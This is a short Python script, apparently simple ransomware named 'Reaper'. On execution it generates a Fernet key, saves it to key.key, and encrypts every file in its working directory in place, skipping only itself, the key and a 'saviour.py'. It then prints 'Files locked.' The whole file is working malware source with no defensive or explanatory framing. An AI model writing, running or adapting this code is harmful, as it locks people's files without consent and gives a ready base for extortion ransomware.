import os
from cryptography.fernet import Fernet


def generate_key():
    key = Fernet.generate_key()

    with open("key.key", "wb") as key_file:
        key_file.write(key)

    return key


class Reaper:
    targets = []

    def gather_targets(self):
        for file in os.listdir():
            if file == "Reaper.py" or file == "key.key" or file == "saviour.py":
                continue

            if os.path.isdir(file):
                continue

            self.targets.append(file)

    def encrypt(self, key):
        for file in self.targets:
            with open(file, "rb") as target_file:
                plain_text = target_file.read()
                cipher = Fernet(key).encrypt(plain_text)

            with open(file, "wb") as target_file:
                target_file.write(cipher)

        print("Files locked.")

    def start(self):
        print("Generating key...")
        key = generate_key()
        print("Locating targets...")
        self.gather_targets()
        print("Encrypting files...")
        self.encrypt(key)


reaper = Reaper()
reaper.start()
